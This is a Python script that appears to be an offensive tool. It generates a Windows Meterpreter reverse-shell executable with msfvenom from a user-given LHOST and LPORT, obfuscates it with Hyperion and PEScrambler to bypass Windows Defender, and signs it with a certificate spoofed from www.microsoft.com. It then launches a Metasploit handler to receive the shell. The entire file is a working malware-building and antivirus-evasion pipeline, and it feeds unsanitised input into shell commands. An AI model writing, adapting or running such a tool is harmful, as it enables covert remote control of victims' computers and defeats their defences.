import os, platform, wget
import time
import sys






if os.path.isfile('/usr/bin/wine') == False:
    print("wine not found")
    print("installing wine")
    os.system("apt-get install wine")
if os.path.isfile('/usr/bin/wine') == True:
    print("\u001b[32m.[+]wine is installed\u001b[37m.")
if os.path.isfile('/usr/bin/msfvenom') == True:
    print("\u001b[32m.[+]msfvenom is installed\u001b[37m.")
    time.sleep(1.5)

if os.path.isfile('/usr/bin/msfvenom') == False:
    print("msfvenom not found")
    print("installing msfvenom")
    os.system("apt-get install metasploit-framework")





type = input("payload type (http,https,tcp):")
host = input("type you lhost:")
port = input("type your lport:")
name = input("entre payload name:")
encoder = input("do you want to use encoder yes/no:")
if encoder == "yes":
  coder = input("which encoder you want to use:")
  os.system("msfvenom -p windows/meterpreter/reverse_"+type+"  lhost="+host+" lport="+port+" -f exe -e "+coder+" -o crypters/" +name+ ".exe")
if encoder == "no":
    os.system("msfvenom -p windows/meterpreter/reverse_"+type+" lhost="+host+" lport="+port+" -f exe -o crypters/" +name+".exe")
bypass = input("do you want to bypass windows deffender:")
if bypass == "yes":
    os.system("cd crypters && wine hyperion.exe "+name+".exe "  "hyp.exe")
    os.system("cd crypters && wine PEScrambler.exe -i hyp.exe -o output/encrypted.exe")

if bypass == "no":
     print("your payload saved as",name,".exe")

sign = input("do you want to sign your exe:")
if sign == "yes":
    os.system("cd crypters/output && python3 signs.py  www.microsoft.com 443 encrypted.exe just.exe")
    os.system("cd crypters/output && rm -rf certs && rm -rf encrypted.exe")
    print("your payload saved in crypters/output folder as just.exe")
if sign == "no":
    print("your payload saved in crypters/output/ folder as encrypted.exe")
msf = input("do you want to start multi/handler:")
if msf == "yes":
  new = input("do you want to change your lhost and lport for multi/handler:")
  if new == "yes":
   has = input("entre your lhost:")
   pa = input("entre your lport:")
   os.system("msfconsole -q -x"  " 'use exploit/multi/handler;set payload windows/meterpreter/reverse_"+type+"; set LHOST "+has+"; set LPORT "+pa+"; run'")
  if new == "no":
    os.system("msfconsole -q -x" " 'use exploit/multi/handler;set payload windows/meterpreter/reverse_"+type+"; set LHOST "+host+"; set LPORT "+port+"; run'")
if msf == "no":
    print("have fun hacking")
    exit()



